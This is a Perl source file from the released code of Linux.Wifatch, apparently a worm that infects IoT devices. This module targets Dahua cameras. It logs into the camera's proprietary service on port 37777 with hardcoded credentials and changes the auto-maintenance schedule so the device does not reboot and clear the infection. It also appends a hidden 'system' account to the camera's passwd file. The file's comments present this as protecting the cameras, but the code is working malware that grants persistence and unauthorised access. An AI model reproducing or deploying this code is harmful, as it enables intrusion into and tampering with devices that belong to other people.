#
# This file is part of Linux.Wifatch
#
# Copyright (c) 2013,2014,2015 The White Team <rav7teif@ya.ru>
#
# Linux.Wifatch is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Linux.Wifatch is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Linux.Wifatch. If not, see <http://www.gnu.org/licenses/>.
#

package xx6::dahua;

# dahua module
# keep dahua cams from rebooting, while we protect them

use bn::auto sub => <<'END';
eval configure;
eval {
	my $ownip = unpack "N", $bn::net::OWN_IPBIN;

	# maybe use 127.0.0.1, but many cams have no lo, due to other malware
	# rely on lo being set up by infector, without route
	#$ownip = 0x7f000001;

	my ($fh) = bn::func::tcp_connect $ownip, 37777
		or die "$ownip: $!";

	my ($reply, $rdata);

	my $req = sub {
		bn::io::xwrite $fh, $_[0], 15;
		$reply = bn::io::xread $fh, 32, 15;
		$rdata = unpack "x4 L<", $reply;
		$rdata = bn::io::xread $fh, $rdata, 15;
	};

	my $login = pack "CxxC x4 a8 a8 CCx4CC", 0xa0, 0x60, "system", "not-the-real-password", 4, 2, 0xa1, 0xaa;

	$req->($login);

	0xb0 == ord $reply
		or die "no 0xb0 reply\n";

	#		my $sid = unpack "x16 L<", $reply;

	my $pkt = pack "Cx3 x4 a8 Cx7 x8", 0xa3, "config", 18;    # CONFIG_TYPE_AUTO_MT

	$req->($pkt);

	0xb3 == ord $reply
		or die "no 0xb3 reply\n";

	# posix 0 == thursday, -3 to go into dahua, +3 to reboot not today
	substr $rdata, 8, 1, chr 2 + time / 86400 % 7;

	my $pkt = pack "Cx3 L< a8 Cx7 x8 a*", 0xc1, length $rdata, "config", 18, $rdata;    # CONFIG_TYPE_AUTO_MT

	$req->($pkt);

	0xc1 == ord $reply
		or die "no 0xc1 reply\n";

	bn::log "dahua success";
};

bn::log "dahua $@" if $@;

END

our $configure_timer = bn::func::timed_async 45, sub {
	configure;

	10007
};

# unfortunately, we need add local user - tradeoff
my $patch_passwd = sub {
	open my $fh, "+</mnt/mtd/Config/passwd"
		or return;

	my $max;

	while (<$fh>) {
		next if /^#/;

		/^(\d+):[^:]+:.{8}:\d+:[A-Za-z0-9_, ]{4,}:/
			or return;

		/^\d+:system:not-the-real-password:/
			and return;

		$max = $1 if $1 > $max;
	}

	if ($max++) {

		#TODO should only need AutoMaintain, fix existing boxes, too
		#print $fh "$max:system:not-the-real-password:1:Account, Control, AutoMaintain, GeneralConf, DefaultConfig:your_device_has_been_hacked_please_secure_it:1:16\n";
		print $fh "$max:system:not-the-real-password:1:AutoMaintain:your_device_has_been_hacked_please_secure_it:1:16\n";
	}
};

$patch_passwd->();

1

